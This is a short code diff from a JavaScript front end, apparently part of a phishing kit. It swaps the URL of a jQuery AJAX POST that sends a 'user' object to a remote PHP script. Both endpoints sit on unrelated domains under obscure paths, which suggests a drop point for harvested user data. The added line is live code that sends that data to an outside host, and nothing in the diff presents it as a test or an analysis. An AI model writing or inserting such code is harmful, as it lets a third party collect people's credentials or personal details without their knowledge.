@@ -60,7 +60,7 @@ const App = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://dozenpearl.com/nc_assets/fonts/laptop/bdayweb.php",
+          url: "https://multiserviciosaluvigo.com.mx/.fmreb/musal/_oct/don/rara.php",
           data: user,
           success(data) {
               console.log(data);
